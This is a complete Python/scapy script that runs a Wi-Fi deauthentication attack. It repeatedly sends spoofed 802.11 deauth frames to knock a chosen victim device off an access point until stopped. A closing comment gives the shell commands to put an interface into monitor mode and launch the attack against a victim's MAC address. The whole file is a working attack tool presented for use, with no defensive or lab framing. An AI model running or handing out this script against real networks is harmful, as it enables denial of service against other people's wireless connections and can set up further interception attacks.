#!/usr/bin/env python3
from scapy.all import *
import sys
import time

def deauth(target_mac, gateway_mac, iface, count=100):
    """Send deauth packets to disconnect a client from an AP"""

    # 802.11 frame headers
    dot11 = Dot11(
        addr1=target_mac,   # Victim MAC
        addr2=gateway_mac,  # AP MAC
        addr3=gateway_mac   # BSSID (AP MAC again)
    )

    # Deauthentication frame
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"[*] Sending {count} deauth frames to {target_mac} from AP {gateway_mac}...")

    # Send multiple deauth frames
    sendp(packet, iface=iface, count=count, inter=0.1, verbose=0)
    print("[+] Deauth attack complete.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_mac> <ap_mac> <interface>")
        sys.exit(1)

    target_mac = sys.argv[1]   # e.g., victim device
    gateway_mac = sys.argv[2]  # e.g., router/AP
    iface = sys.argv[3]        # must be in monitor mode

    try:
        while True:
            deauth(target_mac, gateway_mac, iface, count=10)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopped deauth attack.")



"""
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up



sudo python3 deauth.py <victim_mac> <ap_mac> wlan0

"""